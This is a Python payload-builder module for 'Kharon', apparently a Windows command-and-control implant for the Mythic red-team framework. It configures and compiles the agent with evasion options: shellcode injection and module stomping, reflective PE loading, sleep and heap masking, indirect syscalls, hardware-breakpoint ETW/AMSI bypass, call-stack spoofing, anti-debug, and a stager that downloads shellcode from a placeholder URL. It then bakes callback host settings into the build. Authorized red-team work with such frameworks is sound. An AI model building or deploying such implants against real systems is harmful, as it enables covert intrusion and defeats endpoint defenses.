import logging, json
import traceback
import pathlib

from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from distutils.dir_util import copy_tree
import asyncio, os, tempfile, base64

class KharonAgent( PayloadType ):
    name             = "Kharon";
    file_extension   = "bin";
    author           = "@ Oblivion";
    supported_os     = [SupportedOS.Windows];
    wrapper          = False;
    wrapped_payloads = [];
    note             = \
    """
    Kharon agent. Version: v0.0.1
    """
    supports_dynamic_loading = False;
    c2_profiles      = ["http", "smb"];
    translation_container = "KharonTranslator";
    build_parameters = [
        BuildParameter(
            name           = "Killdate",
            parameter_type = BuildParameterType.Date,
            description    = "1.10 - [AGENT] date to kill the agent",
        ),
        BuildParameter(
            name           = "Self Delete",
            parameter_type = BuildParameterType.Boolean,
            description    = "1.11 - [AGENT] self deletion in kill date routine",
        ),
        BuildParameter(
            name           = "Exit Method",
            parameter_type = BuildParameterType.ChooseOne,
            choices        = ["process", "thread"],
            description    = "1.12 - [AGENT] exit method to kill date routine",
        ),
        BuildParameter(
            name           = "Spawnto",
            parameter_type = BuildParameterType.String,
            default_value  = "C:\\Windows\\System32\\notepad.exe",
            description    = "1.01 - [AGENT] used to fork and run routines",
        ),
        BuildParameter(
            name            = "Architecture",
            parameter_type  = BuildParameterType.ChooseOne,
            choices         = ["x64", "x86"],
            default_value   = "x64",
            description     = "0.03 - architecture to compile",
        ),
        BuildParameter(
            name            = "BOF Hook",
            parameter_type  = BuildParameterType.Boolean,
            default_value   = False,
            description     = "1.09 - [AGENT] beacon object file hooks",
        ),
        BuildParameter(
            name            = "Injection Shellcode",
            parameter_type  = BuildParameterType.ChooseOne,
            choices         = ["classic", "stomp"],
            default_value   = "classic",
            description     = "1.02 - [AGENT] technique used to injection shellcode in memory",
        ),
        BuildParameter(
            name            = "Injection PE",
            parameter_type  = BuildParameterType.ChooseOne,
            choices         = ["reflection"],
            default_value   = "reflection",
            description     = "1.03 - [AGENT] technique used to injection PE in memory",
        ),
        BuildParameter(
            name            = "Mask",
            parameter_type  = BuildParameterType.ChooseOne,
            choices         = ["timer", "none"],
            default_value   = "none",
            description     = "1.04 - [AGENT] technique to beacon obfuscate in memory during sleep",
        ),
        BuildParameter(
            name            = "Heap Mask",
            parameter_type  = BuildParameterType.Boolean,
            default_value   = "false",
            description     = "1.05 - [AGENT] obfuscate the heap during sleep.",
        ),
        BuildParameter(
            name            = "Indirect Syscall",
            parameter_type  = BuildParameterType.Boolean,
            default_value   = "false",
            description     = "1.06 - [AGENT] use indirect syscalls",
        ),
        BuildParameter(
            name            = "Hardware Breakpoint",
            parameter_type  = BuildParameterType.ChooseOne,
            choices         = ["etw", "amsi", "all", "none"],
            default_value   = "none",
            description     = "1.07 - [AGENT] use hardware breakpoint to bypass etw/amsi",
        ),
        BuildParameter(
            name            = "Call Stack Spoofing",
            parameter_type  = BuildParameterType.Boolean,
            default_value   = "false",
            description     = "1.08 - [AGENT] spoof the call stack of the specifieds winapis",
        ),
        BuildParameter(
            name            = "Format",
            parameter_type  = BuildParameterType.ChooseOne,
            choices         = [ "exe", "dll", "svc", "bin"],
            default_value   = "bin",
            description     = "0.02 [GLOBAL] - executable (.exe), dynamic linked library (.dll), service executable (.svc.exe) and shellcode (.bin)",
        ),
        BuildParameter(
            name            = "Debug",
            parameter_type  = BuildParameterType.Boolean,
            default_value   = "false",
            description     = "0.01 [GLOBAL] - generate with debug strings. The debug output is handled using DbgPrint and can be viewed in a debugger",
        ),
        BuildParameter(
            name            = "Method",
            parameter_type  = BuildParameterType.ChooseOne,            
            description     = "2.00 - [LOADER] Method to use shellcode",
            choices         = ["stager", "stageless"],
        ),
        BuildParameter(
            name            = "Stageless",
            parameter_type  = BuildParameterType.ChooseOne,            
            choices         = [".text", ".data"],
            description     = "2.01 - [LOADER] Section to storage the shellcode",
        ),
        BuildParameter(
            name            = "Stager",
            parameter_type  = BuildParameterType.Dictionary,            
            description     = "2.02 - [LOADER] the stager options (first choice is url, second is user-agent and you can create the additional header for the request)",
            dictionary_choices=[
                DictionaryChoice(name="url", default_value="https://localhost.com/shellcode.bin", default_show=True),
                DictionaryChoice(name="user-agent", default_show=True, default_value="mozilla"),
            ],
        ),
        BuildParameter(
            name            = "Anti-Debug",
            parameter_type  = BuildParameterType.Boolean,
            default_value   = "false",
            description     = "2.03 [LOADER] - use anti-debug technique to avoid to debug",
        ),
        BuildParameter(
            name            = "IP White List",
            parameter_type  = BuildParameterType.Boolean,
            default_value   = "false",
            description     = "2.04 [LOADER] - execute the payload only if there are no other instances running on the current machine (use mutex to know this)",
        ),
        BuildParameter(
            name            = "Domain Joined",
            parameter_type  = BuildParameterType.Array,
            default_value   = ["none"],
            description     = "2.05 [LOADER] Use 'none' to allow execution on any domain-joined machine. To restrict execution to specific domain(s), list them and enable the block",
        ),
        BuildParameter(
            name            = "Control Run",
            parameter_type  = BuildParameterType.Boolean,
            default_value   = "false",
            description     = "2.06 - [LOADER] execute the payload only if there are no other instances running on the current machine (use mutex to know this)",
        ),
    ]

    AgentPath = pathlib.Path(".") / "Kharon";
    AgentIconPath = AgentPath / "Kharon.jpg";
    AgentCodePath = pathlib.Path(".") / ".." / "Agent";
    BrowserScriptPath = AgentPath / "BrowserScripts";

    agent_path      = AgentPath;
    agent_icon_path = AgentIconPath;
    agent_code_path = AgentCodePath;
    agent_browserscript_path = BrowserScriptPath;
    
    build_steps = [
        BuildStep(step_name="Gathering Files", step_description="Making sure all commands have backing files on disk"),
        BuildStep(step_name="Applying configuration", step_description="Stamping in configuration values"),
        BuildStep(step_name="Compiling", step_description="Compiling with clang")
    ]

    # Build the actual agent payload
    async def build(self) -> BuildResponse:

        logging.basicConfig( level=logging.INFO );

        print( f"path: {self.AgentIconPath}" );

        resp = BuildResponse( status=BuildStatus.Success );
        
        Config = {
            "payload_uuid": self.uuid,
            "callback_host": "",
            "User-Agent": "",
            "callback_jitter": 0,
            "callback_interval": 0,
            "httpMethod": "POST",
            "post_uri": "",
            "headers": [],
            "callback_port": 80,
            "ssl":False,
            "proxyEnabled": False,
            "proxy_host": "",
            "proxy_user": "",
            "proxy_pass": "",
        }

        stdout_err = "";

        for c2 in self.c2info:
            profile = c2.get_c2profile()
            for key, val in c2.get_parameters_dict().items():
                print( key, val )
                if isinstance(val, dict) and 'enc_key' in val:
                    stdout_err += "Setting {} to {}".format(key, val["enc_key"] if val["enc_key"] is not None else "")
                    encKey = base64.b64decode(val["enc_key"]) if val["enc_key"] is not None else ""
                elif key == "headers":
                    Config["User-Agent"]= val["User-Agent"];
                else:
                    Config[key] = val
            break

        if "https://" in Config["callback_host"]:
            Config["ssl"] = True;

        Config["callback_host"] = Config["callback_host"].replace("https://", "").replace("http://","");
        
        if Config["proxy_host"] != "":
            Config["proxyEnabled"] = True;
        
        print( f"Config: {Config}" );

        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID = self.uuid,
                StepName    = "Gathering Files",
                StepStdout  = "Found all files for payload",
                StepSuccess = True
        ));

        AgentPath = tempfile.TemporaryDirectory( suffix=self.uuid )
        copy_tree( str( self.agent_code_path ), AgentPath.name )
        
        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID = self.uuid,
                StepName    = "Applying configuration",
                StepStdout  = "All configuration setting applied",
                StepSuccess = True
        ));

        Mask = {
            "none" : 3,
            "timer": 1,
            "apc"  : 2
        }
        
        InjectionPE = {
            "reflection": 0
        }

        InjectionSc = {
            "classic": 0
        }

        Arch       = self.get_parameter( "Architecture" );
        Format     = self.get_parameter( "Format" );
        Debug      = self.get_parameter( "Debug" );
        InjSc      = self.get_parameter( "Injection Shellcode" );
        InjPE      = self.get_parameter( "Injection PE" );
        MaskID     = self.get_parameter( "Mask" );
        HeapMask   = self.get_parameter( "Heap Mask" );
        Spawntox64 = self.get_parameter( "Spawnto" );
        Syscalls   = self.get_parameter( "Indirect Syscall" );
        HardBreak  = self.get_parameter( "Hardware Breakpoint" );

        MakeArg = f"";

        if HeapMask is True:
            HeapMask = 1;
        else:
            HeapMask = 0;
        
        if Debug is True:
            Debug   = "on";
            MakeArg = f"{Arch}-debug";
        else:
            Debug   = "off";
            MakeArg = f"{Arch}-release";

        Config['post_uri'] = ( "/" + Config['post_uri'] );

        Secure = 0;

        if Config["ssl"] is True:
            Secure = 1;
        
        if HardBreak == "etw":
            HardBreak = 0x400
        elif HardBreak == "amsi":
            HardBreak = 0x700
        elif HardBreak == "all":
            HardBreak = 0x100
        elif HardBreak == "none":
            HardBreak = 0x000

        if Syscalls is True:
            Syscalls = 1
        else:
            Syscalls = 0

        Def = {
            "Arch"      : f"ARCH={Arch}",
            "Dbg"       : f"DBGMODE={Debug}",
            "Mask"      : f"KH_SLEEP_MASK={Mask[MaskID]}",
            "Time"      : f"KH_SLEEP_TIME={Config['callback_interval']}",
            "Jitter"    : f"KH_SLEEP_JITTER={Config['callback_jitter']}",
            "InjSc"     : f"KH_INJECTION_SC={InjectionSc[InjSc]}",
            "InjPE"     : f"KH_INJECTION_PE={InjectionPE[InjPE]}",
            "HeapMask"  : f"KH_HEAP_MASK={HeapMask}",
            "Syscall"   : f"KH_INDIRECT_SYSCALL_ENABLED={Syscalls}",
            "Hwbp"      : f"KH_HARDWARE_BREAKPOINT_BYPASS_DOTNET={HardBreak}",
            "Spawntox64": f"KH_SPAWNTO_X64={Spawntox64}",
            "uuid"      : f"KH_AGENT_UUID={Config['payload_uuid']}",
            "web-port"  : f"WEB_PORT={Config['callback_port']}",
            "web-host"  : f"WEB_HOST={Config['callback_host']}",
            "web-endpt" : f"WEB_ENDPOINT={Config['post_uri']}",
            "web-ua"    : f"WEB_USER_AGENT=\"{Config['User-Agent']}\"",
            "web-secure": f"WEB_SECURE_ENABLED={Secure}"
        };

        AllDefs = " ".join( Def.values() );
        
        CommandBuild   = f"make -C {AgentPath.name} {MakeArg} BUILD_PATH={AgentPath.name} {AllDefs};";

        FileNameExe = ( AgentPath.name + f"/Bin/Kharon.{Arch}.exe" );
        FileNameBin = ( AgentPath.name + f"/Bin/Kharon.{Arch}.bin" );

        print( f"\n\n exe path: {FileNameExe} bin path: {FileNameBin}" )
        print( f"command for build exe: \n{CommandBuild}" )

        proc           = await asyncio.create_subprocess_shell( CommandBuild, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE );
        stdout, stderr = await proc.communicate();

        print( f"\n\nstdout: \n{stdout.decode("cp850")}" );
        print( f"\n\nstrerr: \n{stderr.decode("cp850")}" );
        
        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID = self.uuid,
                StepName    = "Compile",
                StepStdout  = "Successfuly compiled Kharon Agent",
                StepSuccess = True
        ));

        build_msg    = "";
        resp.payload = open( FileNameBin, "rb" ).read();
        resp.build_stderr = stderr;
        resp.build_stdout = stdout;

        return resp;